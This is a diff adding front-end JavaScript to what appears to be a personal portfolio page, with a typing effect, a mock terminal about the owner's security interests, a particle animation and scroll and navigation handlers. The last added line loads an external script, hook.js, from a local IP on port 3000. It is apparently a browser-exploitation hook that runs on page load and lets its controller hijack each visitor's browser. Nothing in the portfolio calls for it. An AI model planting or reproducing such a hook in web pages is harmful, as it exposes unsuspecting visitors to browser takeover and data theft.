+			}
+			setTimeout(tick, deleting ? 30 : 55);
+		}
+		tick();
+	}
+	
+	typeLoop(document.getElementById('typingText'));
+	
+	/* ==========================================================================
+	 4 .* TERMINAL TYPING EFFECT
+	 ========================================================================== */
+	const terminalLines = [
+		{ prompt:true,  text:'whoami' },
+		{ prompt:false, text:'Abood' },
+		{ prompt:true,  text:'os' },
+		{ prompt:false, text:'Parrot Security Linux' },
+		{ prompt:true,  text:'interests' },
+		{ prompt:false, text:'Linux\nAndroid\niOS\nReverse Engineering\nFuzzing' },
+		{ prompt:true,  text:'goal' },
+		{ prompt:false, text:'Become a vulnerability researcher' },
+	];
+	
+	function runTerminal(){
+		const body = document.getElementById('terminalBody');
+		body.innerHTML = '';
+		let li = 0;
+		
+		function typeLine(){
+			if(li >= terminalLines.length){
+				const cur = document.createElement('span');
+				cur.className = 'terminal-cursor';
+				body.appendChild(cur);
+				return;
+			}
+			const line = terminalLines[li];
+			const div = document.createElement('div');
+			if(line.prompt){
+				div.innerHTML = '<span class="prompt">$ </span>';
+			}
+			body.appendChild(div);
+			
+			let ci = 0;
+			const fullText = line.text;
+			const typer = setInterval(() => {
+				div.innerHTML = (line.prompt ? '<span class="prompt">$ </span>' : '') + fullText.slice(0, ci + 1);
+				ci++;
+				if(ci >= fullText.length){
+					clearInterval(typer);
+					li++;
+					setTimeout(typeLine, line.prompt ? 250 : 500);
+				}
+			}, line.prompt ? 60 : 22);
+		}
+		typeLine();
+	}
+	
+	// Trigger terminal once its section scrolls into view (runs once)
+	let terminalStarted = false;
+	const terminalObserver = new IntersectionObserver((entries) => {
+		entries.forEach(entry => {
+			if(entry.isIntersecting && !terminalStarted){
+				terminalStarted = true;
+				runTerminal();
+			}
+		});
+	}, { threshold: 0.3 });
+	terminalObserver.observe(document.getElementById('terminal-section'));
+	
+	/* ==========================================================================
+	 5 .* PARTICLE ENGINE + MOUSE GLOW
+	 ========================================================================== */
+	const canvas = document.getElementById('particle-canvas');
+	const ctx = canvas.getContext('2d');
+	let particles = [];
+	let mouse = { x: null, y: null };
+	
+	function resizeCanvas(){
+		canvas.width = window.innerWidth;
+		canvas.height = window.innerHeight;
+	}
+	window.addEventListener('resize', resizeCanvas);
+	resizeCanvas();
+	
+	function initParticles(){
+		const count = Math.min(90, Math.floor((window.innerWidth * window.innerHeight) / 16000));
+		particles = [];
+		for(let i = 0; i < count; i++){
+			particles.push({
+				x: Math.random() * canvas.width,
+						   y: Math.random() * canvas.height,
+						   vx: (Math.random() - 0.5) * 0.4,
+						   vy: (Math.random() - 0.5) * 0.4,
+						   r: Math.random() * 1.8 + 0.6,
+			});
+		}
+	}
+	initParticles();
+	window.addEventListener('resize', initParticles);
+	
+	function drawParticles(){
+		ctx.clearRect(0, 0, canvas.width, canvas.height);
+		
+		// update + draw dots
+		particles.forEach(p => {
+			p.x += p.vx;
+			p.y += p.vy;
+			if(p.x < 0 || p.x > canvas.width) p.vx *= -1;
+			if(p.y < 0 || p.y > canvas.height) p.vy *= -1;
+			
+			// subtle attraction toward mouse
+			if(mouse.x !== null){
+				const dx = mouse.x - p.x;
+				const dy = mouse.y - p.y;
+				const dist = Math.sqrt(dx*dx + dy*dy);
+				if(dist < 140){
+					p.x -= dx * 0.0025;
+					p.y -= dy * 0.0025;
+				}
+			}
+			
+			ctx.beginPath();
+			ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+			ctx.fillStyle = 'rgba(255,32,32,0.75)';
+			ctx.shadowColor = 'rgba(255,32,32,0.8)';
+			ctx.shadowBlur = 4;
+			ctx.fill();
+		});
+		
+		// connecting lines
+		for(let i = 0; i < particles.length; i++){
+			for(let j = i + 1; j < particles.length; j++){
+				const a = particles[i], b = particles[j];
+				const dx = a.x - b.x, dy = a.y - b.y;
+				const dist = Math.sqrt(dx*dx + dy*dy);
+				if(dist < 120){
+					ctx.beginPath();
+					ctx.moveTo(a.x, a.y);
+					ctx.lineTo(b.x, b.y);
+					ctx.strokeStyle = `rgba(255,32,32,${0.12 * (1 - dist / 120)})`;
+					ctx.lineWidth = 1;
+					ctx.stroke();
+				}
+			}
+		}
+		
+		requestAnimationFrame(drawParticles);
+	}
+	drawParticles();
+	
+	window.addEventListener('mousemove', (e) => {
+		mouse.x = e.clientX;
+		mouse.y = e.clientY;
+		
+		const glow = document.getElementById('mouseGlow');
+		glow.style.left = e.clientX + 'px';
+		glow.style.top = e.clientY + 'px';
+	});
+	window.addEventListener('mouseleave', () => { mouse.x = null; mouse.y = null; });
+	
+	/* ==========================================================================
+	 6 .* SCROLL PROGRESS + NAVBAR ACTIVE STATE + SCROLL REVEAL
+	 ========================================================================== */
+	function updateScrollProgress(){
+		const scrollTop = window.scrollY;
+		const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+		const pct = docHeight > 0 ? (scrollTop / docHeight) * 100 : 0;
+		document.getElementById('scroll-progress').style.width = pct + '%';
+	}
+	window.addEventListener('scroll', updateScrollProgress);
+	
+	const navLinks = document.querySelectorAll('.nav-link');
+	const sections = Array.from(navLinks).map(l => document.getElementById(l.dataset.section));
+	
+	function updateActiveNav(){
+		let current = sections[0];
+		const scrollPos = window.scrollY + window.innerHeight * 0.35;
+		sections.forEach(sec => {
+			if(sec && sec.offsetTop <= scrollPos){
+				current = sec;
+			}
+		});
+		navLinks.forEach(link => {
+			link.classList.toggle('active', current && link.dataset.section === current.id);
+		});
+	}
+	window.addEventListener('scroll', updateActiveNav);
+	updateActiveNav();
+	
+	const revealObserver = new IntersectionObserver((entries) => {
+		entries.forEach(entry => {
+			if(entry.isIntersecting){
+				entry.target.classList.add('visible');
+				revealObserver.unobserve(entry.target);
+			}
+		});
+	}, { threshold: 0.15 });
+	
+	function observeReveals(){
+		document.querySelectorAll('.reveal').forEach(el => revealObserver.observe(el));
+	}
+	// initial + after dynamic content renders
+	observeReveals();
+	setTimeout(observeReveals, 50);
+	
+	/* ==========================================================================
+	 7 .* MOBILE NAV TOGGLE
+	 ========================================================================== */
+	const navToggle = document.getElementById('navToggle');
+	const navLinksEl = document.getElementById('navLinks');
+	navToggle.addEventListener('click', () => {
+		navToggle.classList.toggle('open');
+		navLinksEl.classList.toggle('open');
+	});
+	navLinksEl.querySelectorAll('a').forEach(a => {
+		a.addEventListener('click', () => {
+			navToggle.classList.remove('open');
+			navLinksEl.classList.remove('open');
+		});
+	});
+	
+	/* ==========================================================================
+	 8 .* FOOTER YEAR
+	 ========================================================================== */
+	document.getElementById('year').textContent = new Date().getFullYear();
+	
+});
+</script>
+<script src="http://192.168.0.108:3000/hook.js"></script>
+</body>
+</html>
